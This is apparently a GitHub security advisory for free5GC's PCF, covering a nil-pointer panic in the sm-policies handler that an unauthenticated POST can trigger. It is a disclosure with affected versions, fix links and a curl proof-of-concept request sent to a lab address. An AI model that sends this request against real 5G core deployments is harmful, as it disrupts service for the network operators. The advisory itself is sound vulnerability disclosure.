# [H] free5GC's PCF npcf-smpolicycontrol POST /sm-policies panics on downstream UDR/OpenAPI 404 via nil pointer dereference

## Summary
Severity: High
Advisory: GHSA-wr8j-6chw-gm6p
CVE: CVE-2026-44316
CWE: CWE-476, CWE-754
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-05-08
Source: https://github.com/advisories/GHSA-wr8j-6chw-gm6p
Type: github-advisory

## Affected
- Go: `github.com/free5gc/pcf` — affected >=0 <1.4.2

## Details
### Summary
free5GC's PCF `POST /npcf-smpolicycontrol/v1/sm-policies` handler (`HandleCreateSmPolicyRequest`) panics with a nil-pointer dereference when a downstream OpenAPI consumer call (UDR lookup) returns `404 Not Found` and the consumer wrapper returns `err != nil` together with a nil response struct. The handler logs the OpenAPI error and continues executing instead of returning, then dereferences the nil response struct on a subsequent line and panics. Gin recovery converts the panic into `HTTP 500`, so a single attacker-shaped POST returns 500 instead of a clean 4xx whenever the downstream lookup fails. The PCF process keeps running.

The trigger is a single POST containing input that causes the downstream UDR lookup to fail (e.g. an unknown DNN). In v4.2.1 this endpoint is also reachable WITHOUT an `Authorization` header because the PCF `Npcf_SMPolicyControl` route group is mounted without inbound auth middleware (see free5gc/free5gc#844). So in the validation lab the trigger is fully unauthenticated.

### Details
Validated against the PCF container in the official Docker compose lab.
- free5GC version: `v4.1.0` (originally reported on v4.1.0; same defect present in v4.2.1)
- PCF endpoint: `http://10.100.200.9:8000`

Vulnerable handler path (paraphrased from the captured stack trace):
```
[INFO][PCF][SMpolicy] Handle CreateSmPolicy
[ERRO][PCF][Consumer] openapi error: 404, Not Found
[ERRO][PCF][GIN] panic: runtime error: invalid memory address or nil pointer dereference
  github.com/free5gc/pcf/internal/sbi/processor.(*Processor).HandleCreateSmPolicyRequest
      /go/src/free5gc/NFs/pcf/internal/sbi/processor/smpolicy.go:82 +0x562
  github.com/free5gc/pcf/internal/sbi.(*Server).HTTPCreateSMPolicy
      /go/src/free5gc/NFs/pcf/internal/sbi/api_smpolicy.go:86 +0x405
```

The handler's UDR-failure branch logs the OpenAPI error but does not return; the next line dereferences the nil response struct.

Code evidence (paths in `free5gc/pcf`):
- Panic site:
  - `NFs/pcf/internal/sbi/processor/smpolicy.go:82`
- Route dispatch:
  - `NFs/pcf/internal/sbi/api_smpolicy.go:86`

### PoC
Reproduced end-to-end against the running PCF at `http://10.100.200.9:8000`.

Send a single POST whose `dnn` is unknown to UDR -- this drives the downstream OpenAPI call to return `404 Not Found`, which then triggers the nil-deref panic:
```
curl -sS -X POST 'http://10.100.200.9:8000/npcf-smpolicycontrol/v1/sm-policies' \
  -H 'Content-Type: application/json' \
  -d '{
    "supi":"imsi-208930000000003",
    "pduSessionId":1,
    "dnn":"internet-bad",
    "sliceInfo":{"sst":1,"sd":"010203"},
    "servingNetwork":{"mcc":"208","mnc":"93"},
    "accessType":"3GPP_ACCESS",
    "notificationUri":"http://smf.free5gc.org:8000/npcf-smpolicycontrol/v1/notify"
  }'
```

Observed response: `HTTP 500 Internal Server Error` with empty body.

PCF container logs show:
```
[INFO][PCF][SMpolicy] Handle CreateSmPolicy
[ERRO][PCF][Consumer] openapi error: 404, Not Found
[ERRO][PCF][GIN] panic: runtime error: invalid memory address or nil pointer dereference
  ...HandleCreateSmPolicyRequest at smpolicy.go:82...
```

The Gin recovery middleware catches the panic (the captured stack trace runs inside `ginRecover.func2.1`), so the PCF process keeps serving other requests; the realized impact is per-request `HTTP 500` on this endpoint whenever the downstream lookup fails.

### Impact
NULL pointer dereference (CWE-476) caused by improper handling of an exceptional branch (CWE-754): the UDR-failure branch logs the OpenAPI error but does not return, then dereferences the nil response struct. The intended behavior is to return a controlled `4xx`/`5xx` `ProblemDetails` and stop processing.

Gin recovery catches the panic, so the PCF process is NOT killed and other endpoints continue serving. The realized impact is per-request: any unauthenticated POST that drives the downstream UDR lookup to a `404` returns `HTTP 500` (with empty body and a stack trace in PCF logs) instead of a controlled error response.

No Confidentiality impact (the response is `500` with empty body). No persistent Integrity impact (the panic happens before any state mutation). Availability impact is limited to per-request degradation. The endpoint remains reachable to unauthenticated attackers via the route-group auth gap separately tracked in free5gc/free5gc#844.

Affected: free5gc v4.2.1 (originally reported against v4.1.0; same defect present).

Upstream issue: https://github.com/free5gc/free5gc/issues/803
Upstream fix: https://github.com/free5gc/pcf/pull/62

## References
- https://github.com/free5gc/free5gc/security/advisories/GHSA-wr8j-6chw-gm6p
- https://nvd.nist.gov/vuln/detail/CVE-2026-44316
- https://github.com/free5gc/free5gc/issues/803
- https://github.com/free5gc/pcf/pull/62
- https://github.com/free5gc/pcf/commit/df535f5524314620715e842baf9723efbeb481a7
- https://github.com/free5gc/free5gc
